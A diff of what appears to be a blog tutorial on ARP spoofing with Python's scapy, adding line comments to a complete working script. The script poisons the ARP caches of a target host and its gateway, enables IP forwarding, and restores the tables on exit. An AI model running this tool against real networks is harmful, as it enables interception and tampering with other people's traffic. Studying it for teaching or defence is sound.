@@ -79,42 +79,45 @@ Keep in mind that this is a simple demonstration with the ICMP protocol. We are 
 ### [](#header-3) Let's code
 
 ```python
-import scapy.all as scapy
-import subprocess
-import time
-import argparse
+import scapy.all as scapy #importing the scapy module
+import subprocess #importing the subprocess module to call system commands
+import time #importing the time module
+import argparse #importing the argparse module to parse command line arguments
 ```
 The `get_target_mac` is using the `scapy` library to send an ARP request to a given IP address and return the MAC address of the target device. The `arp_request` variable is created by using the `scapy.ARP()` function and passing in the destination IP address as an argument. This creates an ARP request packet that is targeted at the specified IP. The `broadcast` variable is created by using the `scapy.Ether()` function and setting the dst parameter to the broadcast MAC address. This creates an Ethernet frame that is set to be broadcast to all devices on the network. The `arp_request_broadcast` variable is created by combining the `broadcast` and `arp_request` packets using the `/` operator. This creates a packet that is both an ARP request and a broadcast Ethernet frame. The `scapy.srp()` function is then used to send the arp_request_broadcast packet and capture any responses. If any responses are received, the function returns the MAC address of the first response in the list. If no responses are received, the function returns `None`.
 ```python
+#defining the function to get the mac address of the target
 def get_target_mac(ip):
-    arp_request = scapy.ARP(pdst=ip)
-    broadcast = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
-    arp_request_broadcast = broadcast/arp_request
-    answered_list= scapy.srp(arp_request_broadcast,timeout=1,verbose=False)[0]
+    arp_request = scapy.ARP(pdst=ip) #create an ARP request
+    broadcast = scapy.Ether(dst='ff:ff:ff:ff:ff:ff') #create a broadcast packet
+    arp_request_broadcast = broadcast/arp_request #combine the ARP request and broadcast packet
+    answered_list= scapy.srp(arp_request_broadcast,timeout=1,verbose=False)[0] #send the packet and store the response in a list
     if answered_list:
-        return answered_list[0][1].src
-    return None
+        return answered_list[0][1].src #return the mac address of the target from the response
+    return None #if no response is received, return None
 ```
 
 The `spoof()` function takes four arguments: the IP and MAC address of the target host, and the IP and MAC address of the default gateway. The function creates two `scapy.ARP` objects, which are used to construct ARP packets that will be sent to the target host and the gateway. The `op` parameter is set to `2` to indicate that these are response packets, and the `pdst` and `psrc` parameters are set to the IP addresses of the target host and gateway, respectively. The `hwdst` parameter is set to the MAC addresses of the target host and gateway. <br>
 Once the `scapy.ARP` objects have been created, the `scapy.send()` function is used to send the packets to the target host and gateway. This causes the target host and gateway to update their ARP tables with the incorrect information from the spoofed packets. As a result, the target host will send any traffic intended for the gateway to the attacker instead, allowing the attacker to intercept and potentially modify the traffic.
 
 ```python
+#defining the function to spoof the ARP cache of the host and the gateway
 def spoof (host_ip,host_mac,gateway,gateway_mac):
-    packet1 = scapy.ARP(op=2,pdst=host_ip,hwdst=host_mac, psrc=gateway)
-    packet2 = scapy.ARP(op=2,pdst=gateway,hwdst=gateway_mac, psrc=host_ip)
-    scapy.send(packet1,verbose=False)
-    scapy.send(packet2,verbose=False)
+    packet1 = scapy.ARP(op=2,pdst=host_ip,hwdst=host_mac, psrc=gateway) #create an ARP response packet to spoof the host
+    packet2 = scapy.ARP(op=2,pdst=gateway,hwdst=gateway_mac, psrc=host_ip) #create an ARP response packet to spoof the gateway
+    scapy.send(packet1,verbose=False) #send the first packet to the host
+    scapy.send(packet2,verbose=False) #send the second packet to the gateway
 ```
 The `restore()` function restores the ARP tables of a target host and gateway after an ARP spoofing attack.<br>
 Once the `scapy.ARP` objects have been created, the `scapy.send()` function is used to send the packets to the target host and gateway. This causes the target host and gateway to update their ARP tables with the correct information from the restored packets. As a result, the target host will no longer send traffic intended for the gateway to the attacker, and the network will be restored to its normal functioning.
 
 ```python
+#defining the function to restore the ARP cache of the host and the gateway
 def restore(host_ip,host_mac,gateway,gateway_mac):
-    packet1 = scapy.ARP(op=2,pdst=host_ip,hwdst=host_mac, psrc=gateway, hwsrc=gateway_mac)
-    packet2 = scapy.ARP(op=2,pdst=gateway,hwdst=gateway_mac, psrc=host_ip, hwsrc=host_mac)
-    scapy.send(packet1 , verbose=False)
-    scapy.send(packet2 , verbose=False)
+    packet1 = scapy.ARP(op=2,pdst=host_ip,hwdst=host_mac, psrc=gateway, hwsrc=gateway_mac) #create an ARP response packet to restore the host
+    packet2 = scapy.ARP(op=2,pdst=gateway,hwdst=gateway_mac, psrc=host_ip, hwsrc=host_mac) #create an ARP response packet to restore the gateway
+    scapy.send(packet1 , verbose=False) #send the first packet to the host
+    scapy.send(packet2 , verbose=False) #send the second packet to the gateway
 ```
 The code uses the `argparse.ArgumentParser()` function to create a `parser` object that can be used to parse command line arguments. The `parser.add_argument()` method is then used to specify that the script expects two required arguments: the IP address of the target host (`--target`) and the IP address of the default gateway (`--gateway`). The `parser.parse_args()` method is used to parse the command line arguments and store them in the `args` object.<br>
 The `get_target_mac()` and `spoof()` functions are then used to perform the ARP spoofing attack. The `get_target_mac()` function is called to get the MAC addresses of the target host and gateway, and the `spoof()` function is called to send the spoofed ARP packets to the target host and gateway.<br>
@@ -123,26 +126,26 @@ When the script is interrupted, the `restore()` function is called to restore th
 
 ```python
 def main():
-    parser = argparse.ArgumentParser()
-    parser.add_argument('-g','--gateway', type=str, required=True)
-    parser.add_argument('-t','--target', type=str, required=True)
-    args = parser.parse_args()
+    parser = argparse.ArgumentParser() #create a new ArgumentParser object
+    parser.add_argument('-g','--gateway', type=str, required=True) #add a new argument 'gateway' which is required and is a string
+    parser.add_argument('-t','--target', type=str, required=True) #add a new argument 'target' which is required and is a string
+    args = parser.parse_args() #parse the command line arguments
     try:
-        p=0
-        target_mac = get_target_mac(args.target)
-        gateway_mac = get_target_mac(args.gateway)
+        p=0 #initialize a counter for the packets sent
+        target_mac = get_target_mac(args.target) #get the mac address of the target
+        gateway_mac = get_target_mac(args.gateway) #get the mac address of the gateway
 
-        subprocess.call('echo 1 > /proc/sys/net/ipv4/ip_forward',shell=True)
+        subprocess.call('echo 1 > /proc/sys/net/ipv4/ip_forward',shell=True) #enable packet forwarding on the system
         while True:
-            spoof(args.target,target_mac,args.gateway,gateway_mac)
-            p+=2
-            print("\r\033[1;31;40mSending packets ["+ str(p) +"]\033[0m" ,end='')
-            time.sleep(3)
+            spoof(args.target,target_mac,args.gateway,gateway_mac) #spoof the ARP cache of the host and the gateway
+            p+=2 #increment the counter by 2
+            print("\r\033[1;31;40mSending packets ["+ str(p) +"]\033[0m" ,end='') #print the counter
+            time.sleep(3) #sleep for 3 seconds
     except KeyboardInterrupt:
-        subprocess.call('echo 0 > /proc/sys/net/ipv4/ip_forward',shell=True)
-        restore(args.target,target_mac,args.gateway,gateway_mac)
+        subprocess.call('echo 0 > /proc/sys/net/ipv4/ip_forward',shell=True) #disable packet forwarding on the system
+        restore(args.target,target_mac,args.gateway,gateway_mac) #restore the ARP cache of the host and the gateway
         print("\nRestoring order ..")
-        print("[+] Spoofing Stopped")
+        print("[+] Spoofing Stopped") 
 ```
 
 ### [](#header-3) Cocnlusion
